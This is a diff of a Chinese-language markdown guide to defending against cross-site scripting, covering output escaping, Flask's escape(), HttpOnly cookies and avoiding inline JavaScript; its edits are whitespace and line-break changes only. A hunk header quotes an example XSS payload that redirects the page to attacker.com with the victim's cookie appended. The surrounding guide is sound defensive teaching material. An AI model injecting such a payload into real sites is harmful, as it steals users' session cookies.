@@ -431,10 +431,10 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
   ```
 * 輸出轉義（Output Escaping） 
   - 在顯示用戶輸入的內容時，對特殊字符進行 HTML 轉義，例如：  
-   >` < 轉換為 &lt;`
-   >`> 轉換為 &gt;`
-   >`" 轉換為 &quot;`
-   >`' 轉換為 &#39;`
+   >` < 轉換為 &lt;`  
+   >`> 轉換為 &gt;`  
+   >`" 轉換為 &quot;`  
+   >`' 轉換為 &#39;`  
   - 在 Python Flask 框架中，可以使用 escape() 來自動轉義：  
   ```python
   from flask import escape
@@ -451,6 +451,7 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
     Set-Cookie: sessionid=abc123; HttpOnly; Secure
     ```
 * 避免內聯 JavaScript（Inline JS）
-  - 禁止 <script> 標籤內部寫 JavaScript，改為使用外部文件。  
+  - 禁止 <script> 標籤內部寫 JavaScript，改為使用外部文件。
+    
 * 使用 Web 安全框架
   -  使用 Django、Flask、Express.js 這類具備 XSS 防護的框架，減少手動防禦的錯誤機會。  
